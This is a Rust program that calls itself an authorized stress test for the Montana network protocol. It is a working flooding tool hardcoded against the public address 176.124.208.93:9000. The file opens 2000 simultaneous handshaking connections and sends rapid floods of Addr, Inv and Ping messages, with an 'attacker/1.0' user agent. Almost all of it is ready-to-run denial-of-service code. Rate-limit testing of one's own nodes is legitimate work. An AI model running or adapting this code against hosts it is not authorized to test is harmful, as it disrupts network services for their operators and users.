//! Montana Network Security Stress Test
//!
//! Authorized penetration testing tool for Montana protocol.
//! Tests: rate limiting, connection limits, message flooding.

use montana::net::{Message, NetAddress, InvItem, InvType, VersionPayload, Addrs, InvItems};
use montana::net::{PROTOCOL_VERSION, PROTOCOL_MAGIC, NODE_FULL};
use montana::types::Hash;
use std::net::{SocketAddr, TcpStream, IpAddr, Ipv4Addr};
use std::io::{Read, Write};
use std::time::{Duration, Instant};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;

const TARGET: &str = "176.124.208.93:9000";

fn create_version() -> VersionPayload {
    VersionPayload {
        version: PROTOCOL_VERSION,
        services: NODE_FULL,
        timestamp: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs(),
        addr_recv: NetAddress::new(
            IpAddr::V4(Ipv4Addr::new(176, 124, 208, 93)),
            9000,
            NODE_FULL,
        ),
        addr_from: NetAddress::new(
            IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)),
            0,
            NODE_FULL,
        ),
        nonce: rand::random(),
        user_agent: "attacker/1.0".to_string(),
        best_slice: 0,
        node_type: montana::types::NodeType::Full,
    }
}

fn serialize_message(msg: &Message) -> Vec<u8> {
    let payload = bincode::serialize(msg).expect("serialize");
    let mut frame = Vec::with_capacity(12 + payload.len());

    // Magic (4 bytes)
    frame.extend_from_slice(&PROTOCOL_MAGIC);

    // Length (4 bytes, little endian)
    frame.extend_from_slice(&(payload.len() as u32).to_le_bytes());

    // Checksum (4 bytes) - first 4 bytes of SHA3-256
    use sha3::{Sha3_256, Digest};
    let hash = Sha3_256::digest(&payload);
    frame.extend_from_slice(&hash[..4]);

    // Payload
    frame.extend_from_slice(&payload);

    frame
}

fn connect_and_handshake() -> Option<TcpStream> {
    let addr: SocketAddr = TARGET.parse().ok()?;
    let mut stream = TcpStream::connect_timeout(&addr, Duration::from_secs(5)).ok()?;
    stream.set_read_timeout(Some(Duration::from_secs(5))).ok()?;
    stream.set_write_timeout(Some(Duration::from_secs(5))).ok()?;

    // Send Version
    let version = Message::Version(create_version());
    let data = serialize_message(&version);
    stream.write_all(&data).ok()?;

    // Wait for Verack (simplified - just read some bytes)
    let mut buf = [0u8; 1024];
    let _ = stream.read(&mut buf).ok()?;

    // Send Verack
    let verack = Message::Verack;
    let data = serialize_message(&verack);
    stream.write_all(&data).ok()?;

    Some(stream)
}

fn test_connection_flood(count: usize) {
    println!("\n=== TEST: Connection Flood ({} connections) ===", count);
    let connected = Arc::new(AtomicU64::new(0));
    let failed = Arc::new(AtomicU64::new(0));
    let start = Instant::now();

    let mut handles = vec![];

    for _ in 0..count {
        let connected = connected.clone();
        let failed = failed.clone();

        let handle = thread::spawn(move || {
            if connect_and_handshake().is_some() {
                connected.fetch_add(1, Ordering::Relaxed);
                // Hold connection for 2 seconds
                thread::sleep(Duration::from_secs(2));
            } else {
                failed.fetch_add(1, Ordering::Relaxed);
            }
        });
        handles.push(handle);
    }

    for h in handles {
        let _ = h.join();
    }

    let elapsed = start.elapsed();
    println!("Connected: {}", connected.load(Ordering::Relaxed));
    println!("Failed: {}", failed.load(Ordering::Relaxed));
    println!("Time: {:?}", elapsed);
}

fn test_message_flood() {
    println!("\n=== TEST: Message Flood (Addr spam) ===");

    if let Some(mut stream) = connect_and_handshake() {
        println!("Connected, sending Addr flood...");

        let addrs_vec: Vec<NetAddress> = (0..1000)
            .map(|i| NetAddress::new(
                IpAddr::V4(Ipv4Addr::new(10, 0, (i / 256) as u8, (i % 256) as u8)),
                19333,
                NODE_FULL,
            ))
            .collect();

        let msg = Message::Addr(Addrs::new_unchecked(addrs_vec));
        let data = serialize_message(&msg);

        let mut sent = 0;
        let start = Instant::now();

        // Try to send 100 Addr messages rapidly
        for _ in 0..100 {
            if stream.write_all(&data).is_ok() {
                sent += 1;
            } else {
                println!("Connection dropped after {} messages", sent);
                break;
            }
        }

        println!("Sent {} Addr messages in {:?}", sent, start.elapsed());
    } else {
        println!("Failed to connect");
    }
}

fn test_inv_flood() {
    println!("\n=== TEST: Inv Flood ===");

    if let Some(mut stream) = connect_and_handshake() {
        println!("Connected, sending Inv flood...");

        let invs_vec: Vec<InvItem> = (0..5000)
            .map(|i| InvItem {
                inv_type: InvType::Tx,
                hash: Hash::from([i as u8; 32]),
            })
            .collect();

        let msg = Message::Inv(InvItems::new_unchecked(invs_vec));
        let data = serialize_message(&msg);

        let mut sent = 0;
        let start = Instant::now();

        for _ in 0..50 {
            if stream.write_all(&data).is_ok() {
                sent += 1;
            } else {
                println!("Connection dropped after {} messages", sent);
                break;
            }
        }

        println!("Sent {} Inv messages in {:?}", sent, start.elapsed());
    }
}

fn test_ping_flood() {
    println!("\n=== TEST: Ping Flood ===");

    if let Some(mut stream) = connect_and_handshake() {
        println!("Connected, sending Ping flood...");

        let mut sent = 0;
        let start = Instant::now();

        for i in 0..10000 {
            let msg = Message::Ping(i);
            let data = serialize_message(&msg);

            if stream.write_all(&data).is_ok() {
                sent += 1;
            } else {
                println!("Connection dropped after {} pings", sent);
                break;
            }
        }

        println!("Sent {} Ping messages in {:?}", sent, start.elapsed());
    }
}

fn main() {
    println!("Montana Security Stress Test");
    println!("Target: {}", TARGET);
    println!("=============================");

    // Test 1: Connection flood - AGGRESSIVE
    test_connection_flood(2000);

    thread::sleep(Duration::from_secs(2));

    // Test 2: Addr message flood
    test_message_flood();

    thread::sleep(Duration::from_secs(2));

    // Test 3: Inv flood
    test_inv_flood();

    thread::sleep(Duration::from_secs(2));

    // Test 4: Ping flood
    test_ping_flood();

    println!("\n=== ALL TESTS COMPLETE ===");
}
